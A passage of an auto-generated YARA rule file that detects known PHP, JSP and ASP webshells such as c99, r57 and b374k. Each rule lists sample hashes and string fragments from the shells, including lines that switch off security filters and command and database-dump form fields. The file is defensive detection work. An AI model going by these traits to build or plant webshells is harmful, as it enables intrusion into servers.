      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash12 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $s1 = "<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>" fullword ascii
      $s2 = "<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>" fullword ascii
      $s3 = "<input type=hidden name=p1>" fullword ascii
      $s4 = "<input type=hidden name=a>" fullword ascii
      $s5 = "function actionRC() {" fullword ascii
      $s6 = "<input type=hidden name=p3>" fullword ascii
      $s7 = "echo \">MySql</option><option value='pgsql' \";" fullword ascii
      $s8 = "<input type=hidden name=c>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _2008_icesword_silic_ghost_source_itsec_2009mssql_378 {
   meta:
      description = "webshell - from files 2008.php, icesword.php, silic.php, ghost_source.php, itsec.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash2 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash3 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash4 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
      hash5 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
      hash6 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$this -> old_offset = $new_offset;" fullword ascii
      $s2 = "$fr .= $name;" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "$this -> datasec[] = $fr;" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "$c_len = strlen($zdata);" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "$crc = crc32($data);" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "$zdata = gzcompress($data);" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "$cdrec .= $name;" fullword ascii /* Goodware String - occured 2 times */
      $s8 = "$unc_len = strlen($data);" fullword ascii /* Goodware String - occured 2 times */
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _2008_phpspy2010_2009lite_2009mssql_379 {
   meta:
      description = "webshell - from files 2008.php, phpspy2010.php, 2009lite.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash2 = "0cab98c7ab99b8a5a624e2b39fb7c3f36809a0032b5cb467f33080f55951ccf0"
      hash3 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash4 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$admin['cookiepre'] = '';" fullword ascii
      $s2 = "$admin['cookiedomain'] = '';" fullword ascii
      $s3 = "$admin['cookiepath'] = '/';" fullword ascii
      $s4 = "$admin['cookielife'] = 86400;" fullword ascii
      $s5 = "$admin['check'] = true;" fullword ascii
      $s6 = "$admin = array();" fullword ascii
      $s7 = ", true " fullword ascii
      $s8 = ", false " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _icesword_silic_380 {
   meta:
      description = "webshell - from files icesword.php, silic.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash2 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
   strings:
      $s1 = "<div style=\"width:350px;height:30px;clear:both;\"><input type=\"submit\" value=\"LOGIN\" style=\"width:80px;\"></div>" fullword ascii
      $s2 = "else{$MSG_TOP = 'PASS IS FALSE';}" fullword ascii
      $s3 = "style:solid;border-width:1px;\">" fullword ascii
      $s4 = "<div style=\"width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;\"><b>{$MSG_TOP}</b></div>" fullword ascii
      $s5 = "<body style=\"background:#AAAAAA;\">" fullword ascii
      $s6 = "<div style=\"width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border" ascii
      $s7 = "\" style=\"width:50px;\">" fullword ascii
      $s8 = "<div style=\"width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _G5_PHPJackal_itsec_381 {
   meta:
      description = "webshell - from files G5.php, PHPJackal.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash2 = "27c9cc91bc0a23939e526012b8b3355b8e1d2c460286595452cd2b7d750f9a16"
      hash3 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "if(!function_exists('ocilogon'))return 0;" fullword ascii
      $s2 = "case 'PostgreSQL':" fullword ascii
      $s3 = "case 'MSSQL':" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "for($i=0;$i<oci_num_fields($stm);$i++)" fullword ascii
      $s5 = "if(!function_exists('pg_connect'))return 0;" fullword ascii
      $s6 = "if(!function_exists('mysql_connect'))return 0;" fullword ascii
      $s7 = "if(!function_exists('mssql_connect'))return 0;" fullword ascii
      $s8 = "case 'Oracle':" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _qyt0dHv1_v4xGus6X_aioshell_382 {
   meta:
      description = "webshell - from files qyt0dHv1.php, v4xGus6X.php, aioshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "9211e746ea45d8531d92fa01889b750187deeb41d5400dbd572b6474a1342803"
   strings:
      $s1 = "$info = 'b';" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "$info = 's';" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "$info = 'c';" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "$info = 'u';" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "$info = 'l';" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "$info = '-';" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "$info = 'p';" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "$info = 'd';" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_Shell__ci___Biz_was_here_c99_locus7s_c99_383 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash4 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s2 = "cho $surl; ?>\" method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login" ascii
      $s3 = "?>\">&nbsp;<input type=\"submit\" name=\\\"submit\\\" value=\"Dump\"></form></td><td width=\"30%\" height=\"1\"></td></tr><tr><t" ascii
      $s4 = "_db\" value=\"\" maxlength=\"64\"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type=\"t" ascii
      $s5 = "rm:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action=\"<?php " ascii
      $s6 = "\" maxlength=\"64\"></td><td><input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"></td><td><input type=\"tex" ascii
      $s7 = "\"\".$surl.\"\\\" method=POST name=\\\"ls_form\\\"><input type=hidden name=act value=\".$dspact.\"><input type=hidden name=d val" ascii
      $s8 = "ame=\"sql_server\" value=\"localhost\" maxlength=\"64\"></td><td><input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c99shell_Shell__ci___Biz_was_here_c99_locus7s_c99_384 {
   meta:
      description = "webshell - from files c99_PSych0.php, c99shell.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash4 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "e=\\\"fdbk_servinf\\\" value=\\\"1\\\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if yo" ascii
      $s2 = "  else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl" ascii
      $s3 = "  if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s4 = "oad&d=\".$ud.\"\\\"><img src=\\\"\".$surl.\"act=img&img=download\\\" alt=\\\"Download\\\" height=\\\"16\\\" width=\\\"19\\\" bor" ascii
      $s5 = "   else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$sur" ascii
      $s6 = "   if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s7 = " bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type=\\\"submit\\\" name=" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _1n73ction_Sst_Sheller_385 {
   meta:
      description = "webshell - from files 1n73ction.php, Sst-Sheller.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "9a3ac5f1bb8152c9e24f9d66a1975bf9b8968eb719074a5bc9a0dcef3b7d6df6"
   strings:
      $s1 = "SecFilterScanPOST Off" fullword ascii
      $s2 = "SecFilterCheckURLEncoding Off" fullword ascii
      $s3 = "SecFilterCheckUnicodeEncoding Off" fullword ascii
      $s4 = "#menu a:hover{" fullword ascii
      $s5 = "#menu a{" fullword ascii
      $s6 = "padding:0 0 0 0;" fullword ascii
      $s7 = "safe_mode_gid = OFF" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _1n73ction_b374k_3_2_2_b374k_3_2_3_386 {
   meta:
      description = "webshell - from files 1n73ction.php, b374k-3.2.2.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash3 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $s1 = "$content = \"\";" fullword ascii
      $s2 = "padding:8px;" fullword ascii
      $s3 = "if(is_dir($file)){" fullword ascii
      $s4 = "margin:0 4px;" fullword ascii
      $s5 = "border:0;" fullword ascii
      $s6 = "background:#222222;" fullword ascii
      $s7 = "color:#000000;" fullword ascii /* Goodware String - occured 2 times */
      $s8 = "font-weight:normal;" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell_r57_Mohajer22_387 {
   meta:
      description = "webshell - from files r57shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s2 = "// Login & password crypted with md5, default is 'r57'" fullword ascii
      $s3 = "echo $fs.$table_up1.$lang[$language.'_text114'].up_down('id24').$table_up2.div('id24').$ts;" fullword ascii
      $s4 = "echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts.\"<tr>\".$fs.\"<td valign=top width=50%>\"" ascii
      $s5 = "echo $fs.$table_up1.$lang[$language.'_text112'].up_down('id22').$table_up2.div('id22').$ts;" fullword ascii
      $s6 = "echo $table_up1.$lang[$language.'_text82'].up_down('id20').$table_up2.div('id20').$ts.\"<tr>\".$fs.\"<td valign=top width=50%>\"" ascii
      $s7 = "echo $fs.$table_up1.$lang[$language.'_text113'].up_down('id23').$table_up2.div('id23').$ts;" fullword ascii
      $s8 = "$version = \"1.3\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _c99v2_c99shell_ctt_sh_c99_388 {
   meta:
      description = "webshell - from files c99v2.php, c99shell.php, ctt_sh.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "$hexdump_rows = 24;" fullword ascii
      $s2 = "$hexdump_lines = 8;" fullword ascii
      $s3 = " if (empty($add_drop)) {$add_drop = true;}" fullword ascii
      $s4 = "  $result = false;" fullword ascii
      $s5 = " return true;" fullword ascii
      $s6 = " else {return false;}" fullword ascii
      $s7 = " else {$sql_sock = false;}" fullword ascii
      $s8 = "header(\"Cache-Control: post-check=0, pre-check=0\", false);" fullword ascii /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _404_in_data02_Jsp_warn_leo_jfolder01_JFolder_shell1_webshell_nc_jsp_suiyue_389 {
   meta:
      description = "webshell - from files 404.jsp, in.jsp, data02.jsp, Jsp.jsp, warn.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash3 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
      hash4 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash5 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash8 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash9 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash10 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash11 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash12 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "String getDrivers()" fullword ascii
      $s2 = "<input type=\"text\" name=\"cmd\" value=\"<%=strCmd%>\" size=50>" fullword ascii
      $s3 = "<input type=\"hidden\" name=\"cmd\" value=\"\">" fullword ascii
      $s4 = "<input type=\"hidden\" name=\"file\" value=\"\">" fullword ascii
      $s5 = "<input type=\"hidden\" name=\"path\" value=\"\">" fullword ascii
      $s6 = "margin-top: 0.1em;" fullword ascii
      $s7 = "margin-left: 0;" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _warn_JFolder_shell1_webshell_nc_390 {
   meta:
      description = "webshell - from files warn.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash2 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash3 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash4 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
   strings:
      $s1 = "//out.println(path + f1.getName());" fullword ascii
      $s2 = "out.println(\"error,upload \");" fullword ascii
      $s3 = "path = path + strSeparator;" fullword ascii
      $s4 = "String strOS = System.getProperty(\"os.name\").toLowerCase();" fullword ascii
      $s5 = "strDir = strDir + strSeparator;" fullword ascii
      $s6 = "//out.print(strPath);" fullword ascii
      $s7 = "strDir = path;" fullword ascii
      $s8 = "String strSeparator = File.separator;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _jfolder01_JFolder_shell1_jsp_391 {
   meta:
      description = "webshell - from files jfolder01.jsp, JFolder.jsp, shell1.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash2 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash3 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash4 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $s1 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s2 = " http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
      $s3 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
      $s4 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
      $s6 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
      $s7 = " - - by " fullword ascii
      $s8 = "1728.aspx</a></b>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_asp_392 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, asp (1).asp, 2014.asp, 4.0 (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash8 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash9 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash10 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash11 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash12 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash13 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash14 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash15 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash16 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash17 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash18 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash19 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash20 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "set b=session(\"b\")" fullword ascii
      $s2 = "set c=session(\"c\")" fullword ascii
      $s3 = "set a=session(\"a\")" fullword ascii
      $s4 = "Set c = Nothing" fullword ascii
      $s5 = "Set b = Nothing" fullword ascii
      $s6 = "c.abort" fullword ascii
      $s7 = "b.abort" fullword ascii
      $s8 = "a.abort" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule __2014_UnKnown_Vip__1__UnKnown_Vip__2012_393 {
   meta:
      description = "webshell - from files _2014.asp, UnKnown Vip (1).asp, UnKnown Vip.asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash3 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash4 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = ">elbat/<>rt/<>dt/<" fullword ascii /* reversed goodware string '</td></tr></table>' */
      $s2 = ">rt/<>dt/<>a/<" fullword ascii /* reversed goodware string '</a></td></tr>' */
      $s3 = "/llaetis/moc.nahzia.www//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
      $s4 = ">->'pot_'=tegrat 'tuogoL=noitcA?'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
      $s5 = "''=yalpsid.elyts.1unem" fullword ascii
      $s6 = "=tuoesuomno " fullword ascii
      $s7 = "&thgirypoC&" fullword ascii
      $s8 = "'enon'=yalpsid;%001:htdiw" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__2014_NEW_WebShell__1___2014_10_23_14_54_16__2013__NEW_WebShell____394 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, 2014.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, .asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash3 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash4 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash5 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
      $s2 = "Server.ScriptTimeout = 7776000" fullword ascii
      $s3 = "conn.ConnectionTimeout = 1" fullword ascii
      $s4 = "If Err.number = -2147217843 or Err.number = -2147467259 Then" fullword ascii
      $s5 = "set conn = Server.CreateObject(\"ADODB.connection\")" fullword ascii
      $s6 = "Set adoCatalog = Nothing" fullword ascii
      $s7 = "Set theFolder = Nothing" fullword ascii
      $s8 = "Function UpFile()" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _asp__1__asp_asp__1___2014_10_23_14_54_16_395 {
   meta:
      description = "webshell - from files asp (1).asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash2 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash3 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
   strings:
      $s1 = "rrs\"body,td{font-size: 12px;background-color:#000000;color:#00ff00;SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #0" ascii
